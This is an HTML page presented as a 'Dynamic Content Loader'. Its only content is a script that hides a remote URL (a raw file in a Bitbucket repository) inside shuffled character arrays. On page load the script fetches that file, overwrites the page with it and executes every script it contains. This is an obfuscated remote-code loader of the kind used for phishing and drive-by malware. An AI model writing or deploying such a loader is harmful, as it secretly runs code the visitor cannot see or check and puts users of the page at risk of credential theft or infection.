<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic Content Loader</title>
</head>
<body>
    <script>
        // Helper function to sort and join array elements
        const _k = (arr) => arr.sort((a, b) => a[0] - b[0]).map(x => x[1]).join("");

        // URL components
        const _s = [[1,"t"],[4,"s"],[2,"t"],[3,"p"],[0,"h"],[7,"/"],[6,"/"],[5,":"]];
        const _h = [[4,"u"],[6,"k"],[0,"b"],[11,"r"],[2,"t"],[8,"t"],[7,"e"],[3,"b"],[12,"g"],[10,"o"],[9,"."],[1,"i"],[5,"c"]];
        const _p0 = [[8,"p"],[9,"u"],[1,"2"],[13,"c"],[4,"a"],[12,"i"],[7,"-"],[5,"l"],[3,"-"],[6,"t"],[0,"p"],[2,"p"],[11,"l"],[10,"b"]];
        const _p1 = [[7,"s"],[6,"i"],[4,"e"],[2,"p"],[5,"m"],[0,"p"],[3,"-"],[1,"2"]];
        const _p2 = [[1,"a"],[0,"r"],[2,"w"]];
        const _p3 = [[2,"i"],[1,"a"],[3,"n"],[0,"m"]];
        const _p4 = [[10,"h"],[5,"e"],[3,"e"],[8,"i"],[7,"S"],[6,"b"],[1,"a"],[0,"G"],[4,"W"],[9,"g"],[11,"t"],[2,"m"]];

        // Main function to load content
        async function load() {
            // Construct URL from components
            const url = _k(_s) + _k(_h) + "/" + [_p0, _p1, _p2, _p3, _p4].map(_k).join("/");

            try {
                // Fetch content from the constructed URL
                const res = await fetch(url);
                const html = await res.text();

                // Parse the HTML content
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, "text/html");

                // Replace current document content with fetched content
                document.head.innerHTML = doc.head.innerHTML;
                document.body.innerHTML = doc.body.innerHTML;

                // Re-add all scripts from the fetched content
                doc.querySelectorAll("script").forEach(old => {
                    const s = document.createElement("script");
                    if (old.src) {
                        s.src = old.src;
                    } else {
                        s.textContent = old.textContent;
                    }
                    document.body.appendChild(s);
                });
            } catch (error) {
                console.error("Error loading content:", error);
            }
        }

        // Execute the load function when the page loads
        window.addEventListener('DOMContentLoaded', load);
    </script>
</body>
</html>
